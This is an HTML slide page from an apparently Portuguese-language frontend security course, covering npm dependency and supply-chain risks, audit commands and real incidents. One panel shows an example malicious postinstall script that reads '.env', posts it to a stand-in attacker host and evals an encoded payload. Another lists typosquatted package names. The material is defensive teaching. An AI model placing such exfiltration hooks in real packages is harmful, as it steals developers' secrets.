<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
  <title>DependÃªncias inseguras</title>
</head>
<body class="min-h-screen bg-slate-950 text-slate-100">
  <div class="min-h-screen flex flex-col">
    <header class="sticky top-0 z-10 border-b border-slate-800 bg-slate-900/80 backdrop-blur">
      <div class="max-w-5xl mx-auto flex items-center justify-between px-4 py-3">
        <a href="001.html" class="text-sm font-semibold tracking-tight text-slate-100">
          Desenvolvimento seguro no frontend
        </a>
        <nav class="flex items-center gap-3 text-xs sm:text-sm">
          <a href="008.html" class="px-3 py-1 rounded-full bg-slate-800 hover:bg-slate-700">
            â—€ Anterior
          </a>
          <div class="hidden md:flex items-center gap-1">
            <a href="001.html" class="px-2 py-1 rounded-full hover:bg-slate-800">01</a>
            <a href="002.html" class="px-2 py-1 rounded-full hover:bg-slate-800">02</a>
            <a href="003.html" class="px-2 py-1 rounded-full hover:bg-slate-800">03</a>
            <a href="004.html" class="px-2 py-1 rounded-full hover:bg-slate-800">04</a>
            <a href="005.html" class="px-2 py-1 rounded-full hover:bg-slate-800">05</a>
            <a href="006.html" class="px-2 py-1 rounded-full hover:bg-slate-800">06</a>
            <a href="007.html" class="px-2 py-1 rounded-full hover:bg-slate-800">07</a>
            <a href="008.html" class="px-2 py-1 rounded-full hover:bg-slate-800">08</a>
            <a href="009.html" class="px-2 py-1 rounded-full bg-sky-500 text-slate-950 font-semibold">09</a>
            <a href="010.html" class="px-2 py-1 rounded-full hover:bg-slate-800">10</a>
            <a href="011.html" class="px-2 py-1 rounded-full hover:bg-slate-800">11</a>
          </div>
          <a href="010.html" class="px-3 py-1 rounded-full bg-sky-500 text-slate-950 font-semibold hover:bg-sky-400">
            PrÃ³ximo â–¶
          </a>
        </nav>
      </div>
    </header>

    <main class="flex-1">
      <section class="max-w-5xl mx-auto px-4 py-10 space-y-8">
        <header class="space-y-3">
          <h1 class="text-3xl sm:text-4xl font-bold tracking-tight">
            DependÃªncias: npm install tambÃ©m Ã© decisÃ£o de seguranÃ§a
          </h1>
          <p class="text-slate-300 text-sm sm:text-base">
            Quando vocÃª instala uma lib, vocÃª instala o cÃ³digo + os bugs + as intenÃ§Ãµes do autor.
          </p>
        </header>

        <section class="space-y-4">
          <div id="dependencies-demo" class="rounded-2xl border border-slate-800 bg-slate-900/60 p-5 text-sm sm:text-base"></div>
          <div class="flex flex-wrap gap-3">
            <button onclick="mostrarRiscosPackageJson()"
                    class="inline-flex items-center gap-2 rounded-full bg-rose-500 px-4 py-2 text-sm font-semibold text-slate-950 shadow-sm hover:bg-rose-400 cursor-pointer">
              âš ï¸ Riscos no package.json
            </button>
            <button onclick="mostrarComandosAudit()"
                    class="inline-flex items-center gap-2 rounded-full bg-sky-500 px-4 py-2 text-sm font-semibold text-slate-950 shadow-sm hover:bg-sky-400 cursor-pointer">
              ğŸ” Comandos de auditoria
            </button>
            <button onclick="mostrarCasosReais()"
                    class="inline-flex items-center gap-2 rounded-full bg-slate-700 px-4 py-2 text-sm font-semibold text-slate-100 shadow-sm hover:bg-slate-600 cursor-pointer">
              ğŸ“° Casos reais de ataque
            </button>
          </div>
        </section>
      </section>
    </main>

    <footer class="border-t border-slate-800 py-3 text-center text-xs text-slate-500">
      Desenvolvimento seguro no frontend â€” Vinicios Neves
    </footer>
  </div>
  
  <script>
    function mostrarRiscosPackageJson() {
      const demo = document.getElementById('dependencies-demo');
      demo.innerHTML = `
        <div style="background: #ffe6e6; padding: 20px; border-radius: 5px; border: 2px solid red; color: #111827;">
          <h3>âš ï¸ Scripts Maliciosos no package.json</h3>
          <p>Scripts que executam automaticamente e <strong>NINGUÃ‰M olha direito:</strong></p>
          
          <pre style="background: white; padding: 15px; overflow-x: auto;">
{
  "name": "meu-projeto",
  "scripts": {
    "build": "react-scripts build",
    "postinstall": "node scripts/setup.js"  // ğŸš¨ Executa automaticamente!
  },
  "dependencies": {
    "react": "^18.0.0",
    "alguma-lib-popular": "^1.0.0"  // ğŸš¨ Pode ter sido hackeada!
  }
}</pre>

          <h4 style="margin-top: 20px;">ğŸš¨ Hooks que executam automaticamente:</h4>
          <ul style="background: white; padding: 15px; border-radius: 5px;">
            <li><code>preinstall</code> - Antes do install</li>
            <li><code>postinstall</code> - Depois do install</li>
            <li><code>prepack</code> - Antes de criar o pacote</li>
            <li><code>prepare</code> - Antes de publicar e apÃ³s install</li>
          </ul>
          
          <pre style="background: #2d2d2d; color: #0f0; padding: 15px; margin-top: 15px;">
// ğŸ’€ Exemplo de script malicioso em postinstall
const fs = require('fs');
const https = require('https');

// Roubando .env
const env = fs.readFileSync('.env', 'utf8');

// Enviando para servidor do atacante
https.post('https://evil-hacker.com/steal', { env });

// Ou pior: instalando backdoor
eval(Buffer.from('base64_encoded_malware', 'base64'));</pre>

          <p style="color: red; font-weight: bold; margin-top: 15px;">
            ğŸ’€ Isso executa durante <code>npm install</code>!
          </p>
        </div>
      `;
    }
    
    function mostrarComandosAudit() {
      const demo = document.getElementById('dependencies-demo');
      demo.innerHTML = `
        <div style="background: #e6f3ff; padding: 20px; border-radius: 5px; border: 2px solid blue; color: #111827;">
          <h3>ğŸ” Comandos de Auditoria e ProteÃ§Ã£o</h3>
          
          <h4>1. Verificar vulnerabilidades conhecidas:</h4>
          <pre style="background: #2d2d2d; color: #fff; padding: 15px; overflow-x: auto;">
# Ver relatÃ³rio de vulnerabilidades
npm audit

# Exemplo de saÃ­da:
# â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
# â”‚ high          â”‚ Prototype Pollution                  â”‚
# â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
# â”‚ Package       â”‚ lodash                               â”‚
# â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
# â”‚ Patched in    â”‚ >=4.17.21                            â”‚
# â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</pre>

          <h4 style="margin-top: 20px;">2. Corrigir automaticamente (quando possÃ­vel):</h4>
          <pre style="background: #2d2d2d; color: #fff; padding: 15px;">
npm audit fix           # Corrige vulnerabilidades automaticamente
npm audit fix --force   # ForÃ§a updates (pode quebrar coisas)</pre>

          <h4 style="margin-top: 20px;">3. Verificar dependÃªncias desatualizadas:</h4>
          <pre style="background: #2d2d2d; color: #fff; padding: 15px;">
npm outdated

# SaÃ­da exemplo:
# Package        Current  Wanted  Latest
# react          17.0.0   17.0.2  18.2.0
# lodash         4.17.15  4.17.21 4.17.21</pre>

          <h4 style="margin-top: 20px;">4. Ferramentas de automaÃ§Ã£o:</h4>
          <div style="background: white; padding: 15px; margin-top: 10px; border-radius: 5px;">
            <ul>
              <li><strong>GitHub Dependabot:</strong> Cria PRs automÃ¡ticos para updates de seguranÃ§a</li>
              <li><strong>Renovate Bot:</strong> Gerenciamento inteligente de dependÃªncias</li>
              <li><strong>Snyk:</strong> Scanner de vulnerabilidades em tempo real</li>
              <li><strong>npm audit em CI/CD:</strong> Bloqueia builds com vulnerabilidades crÃ­ticas</li>
            </ul>
          </div>
          
          <h4 style="margin-top: 20px;">5. Boas prÃ¡ticas:</h4>
          <pre style="background: #2d2d2d; color: #fff; padding: 15px;">
# Use package-lock.json (commitado!)
npm ci  # Em CI/CD (mais rÃ¡pido e determinÃ­stico)

# Ignore scripts de pacotes durante install (mais seguro)
npm install --ignore-scripts

# Verifique checksums
npm install --integrity</pre>
        </div>
      `;
    }
    
    function mostrarCasosReais() {
      const demo = document.getElementById('dependencies-demo');
      demo.innerHTML = `
        <div style="background: #2d2d2d; color: white; padding: 20px; border-radius: 5px; border: 2px solid red;">
          <h3>ğŸ“° Casos Reais de Ataques via Supply Chain</h3>
          
          <div style="background: #1a1a1a; padding: 15px; margin: 15px 0; border-left: 4px solid #ff6b6b; border-radius: 5px;">
            <h4 style="color: #ff6b6b;">ğŸ”´ event-stream (2018)</h4>
            <p>Pacote popular com 2M+ downloads/semana foi comprometido.</p>
            <ul style="color: #ccc;">
              <li>Mantenedor original transferiu controle</li>
              <li>Novo "mantenedor" adicionou dependÃªncia maliciosa</li>
              <li>Roubava chaves de carteiras Bitcoin</li>
              <li>Afetou milhares de aplicaÃ§Ãµes</li>
            </ul>
          </div>
          
          <div style="background: #1a1a1a; padding: 15px; margin: 15px 0; border-left: 4px solid #ff6b6b; border-radius: 5px;">
            <h4 style="color: #ff6b6b;">ğŸ”´ colors & faker.js (2022)</h4>
            <p>Criador intencionalmente sabotou suas prÃ³prias libs populares.</p>
            <ul style="color: #ccc;">
              <li>Mais de 20M+ downloads/semana combinados</li>
              <li>Update malicioso imprimia mensagens infinitas</li>
              <li>Quebrou milhares de builds em produÃ§Ã£o</li>
              <li>Protesto contra grandes empresas usando OSS</li>
            </ul>
          </div>
          
          <div style="background: #1a1a1a; padding: 15px; margin: 15px 0; border-left: 4px solid #ff6b6b; border-radius: 5px;">
            <h4 style="color: #ff6b6b;">ğŸ”´ ua-parser-js (2021)</h4>
            <p>Pacote com 8M+ downloads/semana foi hackeado.</p>
            <ul style="color: #ccc;">
              <li>Atacantes publicaram versÃµes maliciosas</li>
              <li>Instalava mineradores de criptomoeda</li>
              <li>Roubava senhas via trojans</li>
              <li>Ficou ativo por vÃ¡rias horas</li>
            </ul>
          </div>
          
          <div style="background: #1a1a1a; padding: 15px; margin: 15px 0; border-left: 4px solid #ff6b6b; border-radius: 5px;">
            <h4 style="color: #ff6b6b;">ğŸ”´ Typosquatting</h4>
            <p>Pacotes com nomes similares aos populares.</p>
            <pre style="background: black; color: #0f0; padding: 10px; margin-top: 10px;">
# LegÃ­timo:
npm install react-router

# Malicioso (erro de digitaÃ§Ã£o):
npm install react-roouter  # ğŸ’€ Malware!
npm install reqct-router   # ğŸ’€ Malware!
npm install react-r0uter   # ğŸ’€ Malware!</pre>
          </div>
          
          <div style="background: #155724; padding: 20px; margin-top: 20px; border-radius: 5px;">
            <h4 style="color: #6fbf73;">âœ… Como se Proteger:</h4>
            <ol style="color: white;">
              <li>Sempre confira o nome do pacote antes de instalar</li>
              <li>Rode <code>npm audit</code> regularmente</li>
              <li>Use lock files (package-lock.json) commitados</li>
              <li>Configure Dependabot/Renovate no GitHub</li>
              <li>Revise PRs de atualizaÃ§Ã£o de dependÃªncias</li>
              <li>Use <code>--ignore-scripts</code> se possÃ­vel</li>
              <li>Monitore atividade de mantenedores (GitHub)</li>
              <li>Prefira pacotes mantidos por organizaÃ§Ãµes confiÃ¡veis</li>
            </ol>
          </div>
        </div>
      `;
    }
    
    // Estado inicial
    document.getElementById('dependencies-demo').innerHTML = `
      <div style="background: #f0f0f0; padding: 20px; border-radius: 5px; color: #111827;">
        <h3 style="margin-top: 0;">ğŸ’¡ Supply Chain: Um dos Maiores Riscos Atuais</h3>
        <p><strong>Explore os perigos das dependÃªncias:</strong></p>
        <ul style="line-height: 1.8;">
          <li>âš ï¸ Como scripts maliciosos se escondem no package.json</li>
          <li>ğŸ” Ferramentas prÃ¡ticas para auditar seu projeto</li>
          <li>ğŸ“° Casos reais de ataques (event-stream, colors, ua-parser-js)</li>
        </ul>
        <p style="margin-top: 15px; background: #ffe6e6; padding: 12px; border-radius: 5px; border-left: 4px solid red;">
          âš¡ <strong>Alerta:</strong> Cada <code>npm install</code> executa cÃ³digo de terceiros com acesso total ao seu sistema!
        </p>
      </div>
    `;
  </script>

  <p>Mensagem: supply chain hoje Ã© um dos maiores vetores de ataque.</p>
</body>
</html>